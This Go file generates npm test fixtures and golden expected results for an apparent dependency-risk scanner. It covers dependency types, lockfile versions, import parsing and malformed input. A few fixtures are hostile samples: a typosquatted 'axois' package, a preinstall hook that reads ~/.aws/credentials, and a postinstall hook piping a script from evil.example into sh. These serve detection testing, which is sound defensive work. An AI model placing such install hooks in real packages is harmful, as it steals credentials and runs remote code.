package validation

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// WriteCorpusFixtures writes all required test fixtures to the baseDir.
func WriteCorpusFixtures(baseDir string) error {
	fixtures := map[string]map[string]string{
		"npm-simple-deps": {
			"package.json": `{
  "name": "npm-simple-deps",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "lodash": "^4.17.21"
  }
}`,
		},
		"npm-dev-deps": {
			"package.json": `{
  "name": "npm-dev-deps",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "devDependencies": {
    "typescript": "^5.0.0"
  }
}`,
		},
		"npm-peer-deps": {
			"package.json": `{
  "name": "npm-peer-deps",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "peerDependencies": {
    "react": "^18.0.0"
  }
}`,
		},
		"npm-optional-deps": {
			"package.json": `{
  "name": "npm-optional-deps",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "optionalDependencies": {
    "fsevents": "^2.3.2"
  }
}`,
		},
		"npm-workspaces": {
			"package.json": `{
  "name": "workspaces-root",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "workspaces": [
    "packages/*"
  ],
  "dependencies": {
    "lodash": "^4.17.21"
  }
}`,
			"packages/subapp/package.json": `{
  "name": "subapp",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "axios": "^1.6.0"
  }
}`,
		},
		"npm-lock-transitive": {
			"package.json": `{
  "name": "lockfile-transitive-app",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "axios": "^1.6.0"
  }
}`,
			"package-lock.json": `{
  "name": "lockfile-transitive-app",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "lockfile-transitive-app",
      "version": "1.0.0",
      "license": "MIT",
      "repository": "github:user/repo",
      "dependencies": {
        "axios": "^1.6.0"
      }
    },
    "node_modules/axios": {
      "version": "1.6.0",
      "resolved": "https://registry.npmjs.org/axios/-/axios-1.6.0.tgz",
      "integrity": "sha512-axios-integrity-hash",
      "dependencies": {
        "follow-redirects": "^1.15.0"
      }
    },
    "node_modules/follow-redirects": {
      "version": "1.15.0",
      "resolved": "https://registry.npmjs.org/follow-redirects/-/follow-redirects-1.15.0.tgz",
      "integrity": "sha512-redirects-integrity-hash",
      "dev": false
    }
  }
}`,
		},
		"js-ts-imports": {
			"package.json": `{
  "name": "js-ts-imports",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "lodash": "*",
    "express": "*",
    "axios": "*",
    "pkg-default": "*",
    "pkg-type": "*",
    "pkg-export-all": "*",
    "pkg-export-some": "*",
    "pkg-require": "*",
    "pkg-dynamic": "*",
    "@scope/pkg-scoped": "*"
  }
}`,
			"index.ts": `import lodash from "lodash";
import * as fs from "fs";
import "./local-file";
require("express");
import("axios");

// Adversarial import tests
import defaultVal from "pkg-default";
import type { x } from "pkg-type";
export * from "pkg-export-all";
export { y } from "pkg-export-some";
const req = require("pkg-require");
const dyn = import("pkg-dynamic");
import x from "@scope/pkg-scoped";

// Ignore Node built-ins
import path from "node:path";
import crypto from "crypto";

// Flag unresolved dynamic import
const varName = "some-pkg";
require(varName);
`,
		},
		"typosquat-pkg": {
			"package.json": `{
  "name": "axois",
  "version": "1.0.0",
  "description": "Typosquatted package"
}`,
		},
		"credential-reading-pkg": {
			"package.json": `{
  "name": "cred-pkg",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "cat ~/.aws/credentials"
  }
}`,
		},
		"postinstall-curl-pkg": {
			"package.json": `{
  "name": "curl-pkg",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://evil.example/script.sh | sh"
  }
}`,
		},
		"malformed-package-json": {
			"package.json": `{
  "name": "malformed",
  "dependencies": {
    "lodash":
  }
}`,
		},
		"malformed-lockfile": {
			"package.json": `{
  "name": "malformed-lockfile",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo"
}`,
			"package-lock.json": `{
  "name": "malformed",
  "packages":
}`,
		},
		"scoped-packages": {
			"package.json": `{
  "name": "scoped-pkg-app",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "@babel/core": "^7.0.0"
  }
}`,
			"package-lock.json": `{
  "name": "scoped-pkg-app",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "scoped-pkg-app",
      "version": "1.0.0",
      "license": "MIT",
      "repository": "github:user/repo",
      "dependencies": {
        "@babel/core": "^7.0.0"
      }
    },
    "node_modules/@babel/core": {
      "version": "7.20.0",
      "resolved": "https://registry.npmjs.org/@babel/core/-/core-7.20.0.tgz",
      "integrity": "sha512-core-integrity-hash"
    }
  }
}`,
		},
		"duplicate-dependencies": {
			"package.json": `{
  "name": "dup-deps",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "lodash": "^4.17.21",
    "lodash": "^4.17.20"
  }
}`,
		},
		"npm-alias-specs": {
			"package.json": `{
  "name": "alias-app",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "my-lodash": "npm:lodash@^4.17.21"
  }
}`,
		},
		"workspace-references": {
			"package.json": `{
  "name": "workspace-ref-root",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "workspaces": [
    "packages/*"
  ],
  "dependencies": {
    "subapp": "workspace:*"
  }
}`,
		},
		// New mismatch detection fixtures
		"mismatch-undeclared": {
			"package.json": `{
  "name": "mismatch-undeclared",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo"
}`,
			"index.js": `import "lodash";`,
		},
		"mismatch-transitive": {
			"package.json": `{
  "name": "mismatch-transitive",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo"
}`,
			"package-lock.json": `{
  "name": "mismatch-transitive",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "mismatch-transitive",
      "version": "1.0.0",
      "license": "MIT",
      "repository": "github:user/repo"
    },
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-lodash-hash",
      "dev": false
    }
  }
}`,
			"index.js": `import "lodash";`,
		},
		"mismatch-missing-lockfile": {
			"package.json": `{
  "name": "mismatch-missing-lockfile",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "lodash": "^4.17.21"
  }
}`,
			"package-lock.json": `{
  "name": "mismatch-missing-lockfile",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "mismatch-missing-lockfile",
      "version": "1.0.0",
      "license": "MIT",
      "repository": "github:user/repo"
    }
  }
}`,
			"index.js": `import "lodash";`,
		},
		"mismatch-missing-pkgjson": {
			"package.json": `{
  "name": "mismatch-missing-pkgjson",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo"
}`,
			"package-lock.json": `{
  "name": "mismatch-missing-pkgjson",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "mismatch-missing-pkgjson",
      "version": "1.0.0",
      "license": "MIT",
      "repository": "github:user/repo",
      "dependencies": {
        "lodash": "^4.17.21"
      }
    },
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-lodash-hash"
    }
  }
}`,
		},
		"mismatch-unused": {
			"package.json": `{
  "name": "mismatch-unused",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "lodash": "^4.17.21"
  }
}`,
			"index.js": ``,
		},
		"mismatch-unresolved": {
			"package.json": `{
  "name": "mismatch-unresolved",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo"
}`,
			"index.js": `require(dynamicPackageName);`,
		},
		// Lockfile versions & details fixtures
		"lockfile-v1": {
			"package.json": `{
  "name": "lockfile-v1",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "lodash": "^4.0.0"
  }
}`,
			"package-lock.json": `{
  "name": "lockfile-v1",
  "version": "1.0.0",
  "lockfileVersion": 1,
  "dependencies": {
    "lodash": {
      "version": "4.17.21",
      "dev": false,
      "optional": false,
      "requires": {
        "foo": "^1.0.0"
      },
      "dependencies": {
        "foo": {
          "version": "1.0.0",
          "dev": true,
          "optional": true
        }
      }
    }
  }
}`,
		},
		"lockfile-v2": {
			"package.json": `{
  "name": "lockfile-v2",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "lodash": "^4.0.0"
  }
}`,
			"package-lock.json": `{
  "name": "lockfile-v2",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "packages": {
    "": {
      "name": "lockfile-v2",
      "version": "1.0.0",
      "license": "MIT",
      "repository": "github:user/repo",
      "dependencies": {
        "lodash": "^4.0.0"
      }
    },
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-lodash-hash"
    }
  },
  "dependencies": {
    "lodash": {
      "version": "4.17.21"
    }
  }
}`,
		},
		"lockfile-missing-resolved": {
			"package.json": `{
  "name": "lockfile-missing-resolved",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "lodash": "^4.0.0"
  }
}`,
			"package-lock.json": `{
  "name": "lockfile-missing-resolved",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "lockfile-missing-resolved",
      "version": "1.0.0",
      "license": "MIT",
      "repository": "github:user/repo",
      "dependencies": {
        "lodash": "^4.0.0"
      }
    },
    "node_modules/lodash": {
      "version": "4.17.21",
      "integrity": "sha512-lodash-hash"
    }
  }
}`,
		},
		"lockfile-missing-integrity": {
			"package.json": `{
  "name": "lockfile-missing-integrity",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "lodash": "^4.0.0"
  }
}`,
			"package-lock.json": `{
  "name": "lockfile-missing-integrity",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "lockfile-missing-integrity",
      "version": "1.0.0",
      "license": "MIT",
      "repository": "github:user/repo",
      "dependencies": {
        "lodash": "^4.0.0"
      }
    },
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
    }
  }
}`,
		},
		"lockfile-optional-dev": {
			"package.json": `{
  "name": "lockfile-optional-dev",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "lodash": "^4.0.0"
  }
}`,
			"package-lock.json": `{
  "name": "lockfile-optional-dev",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "lockfile-optional-dev",
      "version": "1.0.0",
      "license": "MIT",
      "repository": "github:user/repo",
      "dependencies": {
        "lodash": "^4.0.0"
      }
    },
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-lodash-hash",
      "dev": true,
      "optional": true
    }
  }
}`,
		},
		"empty-package-json": {
			"package.json": `{}`,
		},
		"unsupported-dependency-spec": {
			"package.json": `{
  "name": "unsupported-spec",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "foo": "git+ssh://git@github.com:user/foo.git"
  }
}`,
		},
	}

	for name, files := range fixtures {
		dir := filepath.Join(baseDir, name)
		if err := os.MkdirAll(dir, 0755); err != nil {
			return fmt.Errorf("create fixture dir %s: %w", name, err)
		}
		for filename, content := range files {
			path := filepath.Join(dir, filename)
			if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
				return fmt.Errorf("create file dir %s: %w", filepath.Dir(path), err)
			}
			if err := os.WriteFile(path, []byte(content), 0644); err != nil {
				return fmt.Errorf("write fixture file %s/%s: %w", name, filename, err)
			}
		}
	}

	// Generate huge lockfile programmatically
	hugeDir := filepath.Join(baseDir, "huge-lockfile")
	if err := os.MkdirAll(hugeDir, 0755); err != nil {
		return fmt.Errorf("create huge-lockfile dir: %w", err)
	}
	hugePkgJSON := `{
  "name": "huge-lockfile-app",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo"
}`
	if err := os.WriteFile(filepath.Join(hugeDir, "package.json"), []byte(hugePkgJSON), 0644); err != nil {
		return err
	}
	hugeLockfile := generateHugeLockfile()
	if err := os.WriteFile(filepath.Join(hugeDir, "package-lock.json"), []byte(hugeLockfile), 0644); err != nil {
		return err
	}

	return nil
}

func generateHugeLockfile() string {
	var sb strings.Builder
	sb.WriteString(`{
  "name": "huge-lockfile-app",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "huge-lockfile-app",
      "version": "1.0.0"
    }`)
	for i := 1; i <= 600; i++ {
		sb.WriteString(fmt.Sprintf(`,
    "node_modules/pkg-%d": {
      "version": "1.0.0"
    }`, i))
	}
	sb.WriteString(`
  }
}`)
	return sb.String()
}

// WriteGoldenResults writes the golden expected results file to path.
func WriteGoldenResults(path string) error {
	type GoldenDep struct {
		Name           string `json:"package_name"`
		DependencyType string `json:"dependency_type"`
		Direct         bool   `json:"direct"`
	}
	type FixtureExpectation struct {
		ExpectedDeps     []GoldenDep `json:"expected_dependencies"`
		ExpectedDecision string      `json:"expected_decision"`
		MinScore         int         `json:"min_score"`
		MaxScore         int         `json:"max_score"`
	}

	data := map[string]FixtureExpectation{
		"npm-simple-deps": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"npm-dev-deps": {
			ExpectedDeps: []GoldenDep{
				{Name: "typescript", DependencyType: "dev", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"npm-peer-deps": {
			ExpectedDeps: []GoldenDep{
				{Name: "react", DependencyType: "peer", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"npm-optional-deps": {
			ExpectedDeps: []GoldenDep{
				{Name: "fsevents", DependencyType: "optional", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"npm-workspaces": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
				{Name: "axios", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"npm-lock-transitive": {
			ExpectedDeps: []GoldenDep{
				{Name: "axios", DependencyType: "production", Direct: true},
				{Name: "axios", DependencyType: "production", Direct: true},
				{Name: "follow-redirects", DependencyType: "transitive", Direct: false},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"js-ts-imports": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "source-import", Direct: true},
				{Name: "express", DependencyType: "source-import", Direct: true},
				{Name: "axios", DependencyType: "source-import", Direct: true},
				{Name: "pkg-default", DependencyType: "source-import", Direct: true},
				{Name: "pkg-type", DependencyType: "source-import", Direct: true},
				{Name: "pkg-export-all", DependencyType: "source-import", Direct: true},
				{Name: "pkg-export-some", DependencyType: "source-import", Direct: true},
				{Name: "pkg-require", DependencyType: "source-import", Direct: true},
				{Name: "pkg-dynamic", DependencyType: "source-import", Direct: true},
				{Name: "@scope/pkg-scoped", DependencyType: "source-import", Direct: true},
				{Name: "varName", DependencyType: "unresolved-dynamic-import", Direct: true},
				{Name: "lodash", DependencyType: "production", Direct: true},
				{Name: "express", DependencyType: "production", Direct: true},
				{Name: "axios", DependencyType: "production", Direct: true},
				{Name: "pkg-default", DependencyType: "production", Direct: true},
				{Name: "pkg-type", DependencyType: "production", Direct: true},
				{Name: "pkg-export-all", DependencyType: "production", Direct: true},
				{Name: "pkg-export-some", DependencyType: "production", Direct: true},
				{Name: "pkg-require", DependencyType: "production", Direct: true},
				{Name: "pkg-dynamic", DependencyType: "production", Direct: true},
				{Name: "@scope/pkg-scoped", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "warn",
			MinScore:         25,
			MaxScore:         30,
		},
		"typosquat-pkg": {
			ExpectedDeps:     []GoldenDep{},
			ExpectedDecision: "warn",
			MinScore:         25,
			MaxScore:         50,
		},
		"credential-reading-pkg": {
			ExpectedDeps:     []GoldenDep{},
			ExpectedDecision: "block",
			MinScore:         100,
			MaxScore:         150,
		},
		"postinstall-curl-pkg": {
			ExpectedDeps:     []GoldenDep{},
			ExpectedDecision: "block",
			MinScore:         100,
			MaxScore:         150,
		},
		"malformed-package-json": {
			ExpectedDeps:     []GoldenDep{},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"malformed-lockfile": {
			ExpectedDeps:     []GoldenDep{},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"scoped-packages": {
			ExpectedDeps: []GoldenDep{
				{Name: "@babel/core", DependencyType: "production", Direct: true},
				{Name: "@babel/core", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"duplicate-dependencies": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"npm-alias-specs": {
			ExpectedDeps: []GoldenDep{
				{Name: "my-lodash", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"workspace-references": {
			ExpectedDeps: []GoldenDep{
				{Name: "subapp", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		// Expected golden mismatches
		"mismatch-undeclared": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "source-import", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         15,
			MaxScore:         20,
		},
		"mismatch-transitive": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "transitive", Direct: false},
				{Name: "lodash", DependencyType: "source-import", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         15,
			MaxScore:         20,
		},
		"mismatch-missing-lockfile": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
				{Name: "lodash", DependencyType: "source-import", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         10,
			MaxScore:         15,
		},
		"mismatch-missing-pkgjson": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         10,
			MaxScore:         15,
		},
		"mismatch-unused": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"mismatch-unresolved": {
			ExpectedDeps: []GoldenDep{
				{Name: "dynamicPackageName", DependencyType: "unresolved-dynamic-import", Direct: true},
			},
			ExpectedDecision: "warn",
			MinScore:         25,
			MaxScore:         30,
		},
		// Expected golden lockfile versions
		"lockfile-v1": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
				{Name: "lodash", DependencyType: "production", Direct: true}, // Direct in lockfile
				{Name: "foo", DependencyType: "transitive", Direct: false},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"lockfile-v2": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
				{Name: "lodash", DependencyType: "production", Direct: true}, // Direct in lockfile
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"lockfile-missing-resolved": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
				{Name: "lodash", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"lockfile-missing-integrity": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
				{Name: "lodash", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"lockfile-optional-dev": {
			ExpectedDeps: []GoldenDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
				{Name: "lodash", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"empty-package-json": {
			ExpectedDeps:     []GoldenDep{},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         15,
		},
		"unsupported-dependency-spec": {
			ExpectedDeps: []GoldenDep{
				{Name: "foo", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
	}

	hugeExpectation := FixtureExpectation{
		ExpectedDeps:     make([]GoldenDep, 0, 600),
		ExpectedDecision: "allow",
		MinScore:         0,
		MaxScore:         10,
	}
	for i := 1; i <= 600; i++ {
		hugeExpectation.ExpectedDeps = append(hugeExpectation.ExpectedDeps, GoldenDep{
			Name:           fmt.Sprintf("pkg-%d", i),
			DependencyType: "transitive",
			Direct:         false,
		})
	}
	data["huge-lockfile"] = hugeExpectation

	b, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(path, b, 0644)
}
